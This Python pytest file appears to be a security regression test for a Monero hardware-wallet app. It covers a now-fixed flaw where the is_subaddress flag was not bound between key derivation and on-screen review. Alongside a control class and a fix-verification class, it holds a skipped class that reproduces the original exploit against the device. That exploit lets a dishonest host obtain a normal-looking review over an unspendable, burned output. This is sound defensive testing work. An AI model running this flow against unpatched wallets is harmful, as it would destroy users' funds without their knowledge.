"""
is_subaddress was not bound between derivation and review.

INS_GEN_TXOUT_KEYS uses it to pick the derivation -- with need_additional_txkeys
set it derives against the per-output additional secret instead of the tx secret,
and publishes s*Bout instead of s*G (src/monero_key.c:1002-1035).
INS_VALIDATE/P1=2 uses its own copy for one thing only: the address prefix on
screen.

The OUTK chain linking the two hashed (Aout, Bout, is_change) at derivation and
(Aout, Bout, is_change, AKout) at review, and is_subaddress was in neither. That
chain only catches a host contradicting itself on the fields it covers, so the two
commands could disagree unnoticed. AKout doesn't help: it changes with the
derivation, but the host echoes back the device-encrypted value it was given.

So lying at derivation and telling the truth at review gave a correct-looking
review over an output nobody can recover -- a burn, not a theft. The fix adds
is_subaddress to both chains at the same position, so a mismatch is now rejected
0x6914, like a mismatched Aout/Bout.

Classes, in file order:
  TestIsSubaddressChangesTheOutputKey  the field changes the on-chain output key
                                       and additional pubkey. No UI.
  TestOutkCompareCatchesBout           control: Bout, always covered, gives 0x6914
                                       -- so the harness can detect a mismatch.
  TestIsSubaddressUnboundVuln          the original exploit; skipped now. Use
                                       --run-skipped on a build without the fix.
  TestIsSubaddressBoundEnforced        the same flow must now give 0x6914.

Accepted rows live elsewhere: is_subaddress consistently 0 in test_sig_real_*,
consistently 1 in test_vuln_subaddr_dest_change.py. Both refusal classes exit the
app, so each ends on its assertion.

Run: pytest tests/test_vuln_is_subaddress_unbound.py -v --device flex   (DEBUG=1
build). Snapshot dirs are named after the bare test function, so method names must
stay unique across the whole suite.
"""

import struct

import pytest

from ragger.backend.interface import BackendInterface
from ragger.error import ExceptionRAPDU
from ragger.navigator import Navigator

from monero_client.monero_types import SigType, Keys, Type, InsType
from monero_client.monero_cmd import MoneroCmd, PROTOCOL_VERSION
from monero_client.monero_crypto_cmd import MoneroCryptoCmd
from monero_client.crypto.hmac import hmac_sha256
from monero_client.utils.tx_prefix import build_tx_prefix_outkeys
from monero_client.utils.varint import encode_varint

# Raised by the OUTK destination-chain comparison. Not behind DEBUG=1.
SW_SECURITY_COMMITMENT_CHAIN_CONTROL = 0x6914

ZERO_COMMITMENT = bytes(32)
ATTACKER_PROOF = b"\xad" * 32
FEE = 30660000       # 0.00003066 XMR
AMOUNTS = [907880000, 0]   # destination, then a zero-amount change


def _raw_apdu(ins: InsType, p1: int, p2: int, option: int, payload: bytes = b"") -> bytes:
    """Full APDU in the app's framing (option is the first data byte)."""
    return struct.pack("BBBBBB", PROTOCOL_VERSION, ins.value, p1, p2,
                       1 + len(payload), option) + payload


def _output_payload(view: bytes, spend: bytes, ak: bytes, blinded_mask: bytes,
                    blinded_amount: bytes, is_change: bool,
                    is_subaddress: bool) -> bytes:
    """An INS_VALIDATE/P1=2 record. is_subaddress is a parameter here -- it is the
    field under test."""
    return b"".join((
        b"\x01" if is_subaddress else b"\x00",
        b"\x01" if is_change else b"\x00",
        view, spend, ak,
        hmac_sha256(ak, MoneroCryptoCmd.HMAC_KEY, Type.AMOUNT_KEY),
        ZERO_COMMITMENT, blinded_mask, blinded_amount,
    ))


def _gen_txout_keys_raw(backend: BackendInterface, tx_priv_key: bytes,
                        tx_pub_key: bytes, view: bytes, spend: bytes,
                        output_index: int, is_change: bool, is_subaddress: bool,
                        additional_sec: bytes):
    """INS_GEN_TXOUT_KEYS with an explicit additional secret. The client helper
    reuses the tx private key there, making s == r and both derivation branches
    identical. Returns (amount_key, out_eph_key, additional_pub)."""
    def _k(v):
        return v + hmac_sha256(v, MoneroCryptoCmd.HMAC_KEY, Type.SCALAR)

    payload = b"".join((
        struct.pack(">I", 0),                       # tx_version
        _k(tx_priv_key), tx_pub_key, view, spend,
        struct.pack(">I", output_index),
        b"\x01" if is_change else b"\x00",
        b"\x01" if is_subaddress else b"\x00",
        b"\x01",                                    # need_additional_txkeys
        _k(additional_sec),
        b"\x00",                                    # use_view_tags
    ))
    data = backend.exchange_raw(
        _raw_apdu(InsType.INS_GEN_TXOUT_KEYS, 0, 0, 0x00, payload)).data
    assert len(data) == 128, f"expected 128 bytes with additional keys, got {len(data)}"
    return data[:32], data[64:96], data[96:128]


def _open_real_tx(monero: MoneroCmd, state):
    """reset -> REAL -> open_tx, recording the device's own keys as the victim.
    REAL matters: without it tx_sig_mode stays NONE, every REAL-only block (the
    OUTK chain included) is skipped, and INS_BLIND is refused 0x6980."""
    monero.reset_and_get_version(monero_client_version=b"0.18")
    view, spend, addr = monero.get_public_keys()
    state["victim"] = Keys(public_view_key=view, public_spend_key=spend,
                           secret_view_key=None, secret_spend_key=None, addr=addr)
    assert monero.set_signature_mode(sig_type=SigType.REAL) == SigType.REAL
    tx_pub_key, tx_priv_key, _, _ = monero.open_tx()
    state["R"] = tx_pub_key
    state["tx_pub_key"] = tx_pub_key
    state["tx_priv_key"] = tx_priv_key


def _derive_two_outputs(monero: MoneroCmd, state, gen_is_subaddress: bool):
    """Derive the destination and the change output, telling the device
    `gen_is_subaddress` for the destination.

    A destination declared a subaddress with no additional key legitimately
    carries txkey_pub = r*Bout rather than r*G, and the device now requires that
    form (monero_key.c:965-985). Send the matching one, or the derivation is
    refused 0x6984 long before the OUTK chain is reached. Computed on-device, as
    the wallet does -- the host never sees r."""
    if gen_is_subaddress:
        state["tx_pub_key"] = monero.secret_scalar_mul_key(
            pub_key=state["victim"].public_spend_key,
            _scalar=state["tx_priv_key"])
        assert state["tx_pub_key"] != state["R"], "r*Bout must differ from r*G"
    state["ak"], state["eph"] = [], []
    for index, (is_change, is_sub) in enumerate(
            ((False, gen_is_subaddress), (True, False))):
        ak, eph, _ = monero.gen_txout_keys(
            _tx_priv_key=state["tx_priv_key"], tx_pub_key=state["tx_pub_key"],
            dst_pub_view_key=state["victim"].public_view_key,
            dst_pub_spend_key=state["victim"].public_spend_key,
            output_index=index, is_change_addr=is_change, is_subaddress=is_sub)
        state["ak"].append(ak)
        state["eph"].append(eph)


def _stream_prefix_and_blind(monero: MoneroCmd, device, test_name: str, state):
    """Honest prefix carrying the device-derived keys, then masks and blinds."""
    prefix = build_tx_prefix_outkeys(vout_keys=state["eph"],
                                     tx_pubkey=state["tx_pub_key"])
    monero.prefix_hash_init(test_name, device, navigator=None, version=0, timelock=0)
    state["prefixh"] = monero.prefix_hash_update(index=1, payload=prefix,
                                                 is_last=True)
    masks = [monero.gen_commitment_mask(ak) for ak in state["ak"]]
    state["blinded_mask"], state["blinded_amount"] = [], []
    for ak, mask, amount in zip(state["ak"], masks, AMOUNTS):
        bm, ba = monero.blind(_ak_amount=ak, mask=mask, amount=amount,
                              is_short=True)
        state["blinded_mask"].append(bm)
        state["blinded_amount"].append(ba)


@pytest.mark.incremental
class TestIsSubaddressChangesTheOutputKey:
    """is_subaddress decides who can spend: two derivations differing only in that
    flag must give a different one-time key and additional pubkey."""

    @staticmethod
    @pytest.fixture(autouse=True, scope="class")
    def state():
        return {}

    @staticmethod
    def test_field_changes_derivation(monero: MoneroCmd, backend: BackendInterface,
                                      state):
        # A throwaway tx, just for a second device-encrypted scalar: the additional
        # secret must differ from r. The spk key is seed-derived and the DEBUG hmac
        # key constant, so enc(r) from one tx is usable in the next.
        _open_real_tx(monero, state)
        other_sec = state["tx_priv_key"]
        monero.close_tx()

        _open_real_tx(monero, state)
        assert other_sec != state["tx_priv_key"], "the two tx secrets must differ"

        derived = {}
        for is_sub in (False, True):
            derived[is_sub] = _gen_txout_keys_raw(
                backend, state["tx_priv_key"], state["tx_pub_key"],
                state["victim"].public_view_key, state["victim"].public_spend_key,
                output_index=0, is_change=False, is_subaddress=is_sub,
                additional_sec=other_sec)

        assert derived[False][1] != derived[True][1], (
            "is_subaddress did not change the one-time output key -- the premise "
            "of this test no longer holds")
        assert derived[False][2] != derived[True][2], (
            "is_subaddress did not change the additional tx pubkey")
        print(f"\n[impact] same inputs, is_subaddress flipped:\n"
              f"  out key  0 -> {derived[False][1].hex()}\n"
              f"           1 -> {derived[True][1].hex()}\n"
              f"  add pub  0 -> {derived[False][2].hex()}\n"
              f"           1 -> {derived[True][2].hex()}")

    @staticmethod
    def test_field_close(monero: MoneroCmd):
        monero.close_tx()


@pytest.mark.incremental
class TestOutkCompareCatchesBout:
    """Control: the chain works for the fields it covers. Same shape as the attack,
    but Bout is altered at review instead of is_subaddress -- without this, the
    other classes prove nothing. Rejected before the review is drawn."""

    @staticmethod
    @pytest.fixture(autouse=True, scope="class")
    def state():
        return {}

    @staticmethod
    def test_control_bout_setup(monero: MoneroCmd, device, test_name: str, state):
        _open_real_tx(monero, state)
        _derive_two_outputs(monero, state, gen_is_subaddress=False)
        _stream_prefix_and_blind(monero, device, test_name, state)

    @staticmethod
    def test_control_bout_mismatch_rejected(monero: MoneroCmd,
                                            backend: BackendInterface,
                                            navigator: Navigator, device,
                                            test_name: str, state):
        monero.validate_prehash_init(test_name, device, navigator, 1, 0, FEE)
        # Output 0 with a Bout the device never derived against. Sent through the
        # client, not a raw APDU: on BAGL every output draws a blocking review and
        # the reply is deferred until it is navigated.
        forged_spend = bytes(a ^ b for a, b in
                             zip(state["victim"].public_spend_key, b"\x01" + bytes(31)))
        monero.validate_prehash_update(
            backend, test_name, navigator, index=1, is_short=True,
            is_change_addr=False, is_subaddress=False,
            dst_pub_view_key=state["victim"].public_view_key,
            dst_pub_spend_key=forged_spend,
            _ak_amount=state["ak"][0], commitment=ZERO_COMMITMENT,
            blinded_amount=state["blinded_amount"][0],
            blinded_mask=state["blinded_mask"][0], is_last=False)
        # Output 1 clears MORE, so the chain is finalized and compared here.
        with pytest.raises(ExceptionRAPDU) as exc:
            backend.exchange_raw(_raw_apdu(
                InsType.INS_VALIDATE, 2, 2, 0x02,
                _output_payload(state["victim"].public_view_key,
                                state["victim"].public_spend_key,
                                state["ak"][1], state["blinded_mask"][1],
                                state["blinded_amount"][1],
                                is_change=True, is_subaddress=False)))
        assert exc.value.status == SW_SECURITY_COMMITMENT_CHAIN_CONTROL, (
            f"expected 0x6914 for a Bout the device never derived against, got "
            f"{exc.value.status:#06x}")
        print("\n[control] Bout is covered by the OUTK chain: mismatch rejected 0x6914")


@pytest.mark.skip(reason="Demonstrates the (now-fixed) unbound address type; passes "
                         "only on a build without is_subaddress in the OUTK chain. Use "
                         "--run-skipped to re-confirm the exploit.")
@pytest.mark.incremental
class TestIsSubaddressUnboundVuln:
    """Derive as a subaddress, review as a standard address. Identical to the
    control except for which field is flipped; the chain did not cover this one, so
    the compare passed and the victim's own address was displayed."""

    @staticmethod
    @pytest.fixture(autouse=True, scope="class")
    def state():
        return {}

    @staticmethod
    def test_unbound_setup(monero: MoneroCmd, device, test_name: str, state):
        # The device is told the destination is a SUBADDRESS while deriving.
        _open_real_tx(monero, state)
        _derive_two_outputs(monero, state, gen_is_subaddress=True)
        _stream_prefix_and_blind(monero, device, test_name, state)

    @staticmethod
    def test_unbound_review_shows_standard_address(monero: MoneroCmd,
                                                   backend: BackendInterface,
                                                   navigator: Navigator,
                                                   test_name: str, state):
        """Review says is_subaddress = 0, so the victim's ordinary address is
        rendered. The snapshot matches an honest run, which is the point."""
        monero.validate_prehash_init(test_name, backend.device, navigator, 1, 0, FEE)
        for index, is_change in enumerate((False, True)):
            monero.validate_prehash_update(
                backend, test_name, navigator, index=index + 1, is_short=True,
                is_change_addr=is_change,
                is_subaddress=False,          # <-- differs from derivation time
                dst_pub_view_key=state["victim"].public_view_key,
                dst_pub_spend_key=state["victim"].public_spend_key,
                _ak_amount=state["ak"][index], commitment=ZERO_COMMITMENT,
                blinded_amount=state["blinded_amount"][index],
                blinded_mask=state["blinded_mask"][index],
                is_last=index == 1, swipe_count=3)

    @staticmethod
    def test_unbound_finalize_succeeds(backend: BackendInterface, state):
        """A 32-byte prehash means the compare accepted a review whose address type
        contradicts the derivation."""
        try:
            data = backend.exchange_raw(_raw_apdu(
                InsType.INS_VALIDATE, 3, 1, 0x00,
                state["prefixh"] + ATTACKER_PROOF)).data
        except ExceptionRAPDU as exc:
            pytest.fail(
                f"terminal INS_VALIDATE P1=3 refused with {exc.status:#06x} -- "
                "is_subaddress now appears to be bound (is this a fixed build?)")
        assert len(data) == 32
        print("\n[confirmed] derived with is_subaddress=1, reviewed with 0: the OUTK "
              "compare passed, the victim's own address was displayed, and the "
              f"device returned a pre-MLSAG hash {data.hex()}")

    @staticmethod
    def test_unbound_close(monero: MoneroCmd):
        monero.close_tx()


@pytest.mark.incremental
class TestIsSubaddressBoundEnforced:
    """Fix verification: the address type must match between the two commands. The
    twin of the control class -- is_subaddress flipped instead of Bout, and both are
    now covered, so both are rejected alike."""

    @staticmethod
    @pytest.fixture(autouse=True, scope="class")
    def state():
        return {}

    @staticmethod
    def test_bound_setup(monero: MoneroCmd, device, test_name: str, state):
        # Derive telling the device the destination is a SUBADDRESS.
        _open_real_tx(monero, state)
        _derive_two_outputs(monero, state, gen_is_subaddress=True)
        _stream_prefix_and_blind(monero, device, test_name, state)

    @staticmethod
    def test_bound_mismatch_rejected(monero: MoneroCmd, backend: BackendInterface,
                                     navigator: Navigator, device, test_name: str,
                                     state):
        monero.validate_prehash_init(test_name, device, navigator, 1, 0, FEE)
        # Accepted here: the chain is only compared once MORE clears. Sent through
        # the client, which navigates the blocking per-output review on BAGL.
        monero.validate_prehash_update(
            backend, test_name, navigator, index=1, is_short=True,
            is_change_addr=False, is_subaddress=False,
            dst_pub_view_key=state["victim"].public_view_key,
            dst_pub_spend_key=state["victim"].public_spend_key,
            _ak_amount=state["ak"][0], commitment=ZERO_COMMITMENT,
            blinded_amount=state["blinded_amount"][0],
            blinded_mask=state["blinded_mask"][0], is_last=False)
        # Output 1 clears MORE, so the chain is finalized and compared here.
        with pytest.raises(ExceptionRAPDU) as exc:
            backend.exchange_raw(_raw_apdu(
                InsType.INS_VALIDATE, 2, 2, 0x02,
                _output_payload(state["victim"].public_view_key,
                                state["victim"].public_spend_key,
                                state["ak"][1], state["blinded_mask"][1],
                                state["blinded_amount"][1],
                                is_change=True, is_subaddress=False)))
        assert exc.value.status == SW_SECURITY_COMMITMENT_CHAIN_CONTROL, (
            f"expected 0x6914 for an address type that contradicts the derivation, "
            f"got {exc.value.status:#06x}")
        print("\n[fixed] is_subaddress is covered by the OUTK chain: derivation said "
              "subaddress, review said standard, rejected 0x6914")
